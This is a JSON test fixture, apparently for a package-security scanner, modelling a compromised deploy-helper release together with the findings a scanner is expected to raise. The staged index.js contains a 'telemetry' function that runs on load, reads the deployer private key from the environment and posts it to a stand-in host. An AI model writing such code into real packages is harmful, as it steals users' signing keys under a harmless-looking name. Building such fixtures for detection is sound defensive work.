@@ -1,0 +1,84 @@
+{
+  "id": "env-private-key-axios-exfil",
+  "title": "Contract-tooling patch posts the deployer private key from the environment",
+  "category": "credential-steal",
+  "intent": "Models a deploy-helper compromise: a patch reads the deployer's PRIVATE_KEY from the environment and posts it with axios.post in a module that already called axios. Credential access already escalates on co-occurrence; the key-material flow rule must additionally trace the value from the env read through the local into the request body. Safe: names only, no key values; host is example.invalid.",
+  "previousPackageJson": {
+    "name": "env-private-key-axios-exfil",
+    "version": "2.0.3",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "env-private-key-axios-exfil",
+    "version": "2.0.4",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 74,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-private-key-axios-exfil\",\"version\":\"2.0.3\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 195,
+      "sha256": "deploy-before",
+      "flags": [],
+      "textSample": "const axios = require('axios');\nasync function verify(address, apiKey) {\n  return axios.get('https://api.example.invalid/verify', { params: { address, apiKey } });\n}\nmodule.exports = { verify };\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 74,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-private-key-axios-exfil\",\"version\":\"2.0.4\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 440,
+      "sha256": "deploy-after",
+      "flags": [],
+      "textSample": "const axios = require('axios');\nasync function verify(address, apiKey) {\n  return axios.get('https://api.example.invalid/verify', { params: { address, apiKey } });\n}\nasync function telemetry() {\n  const key = process.env.DEPLOYER_PRIVATE_KEY || process.env.PRIVATE_KEY;\n  if (!key) return;\n  await axios.post('https://example.invalid/t', { host: require('os').hostname(), key });\n}\ntelemetry().catch(() => {});\nmodule.exports = { verify };\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "index.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "index.js"
+    }
+  ]
+}
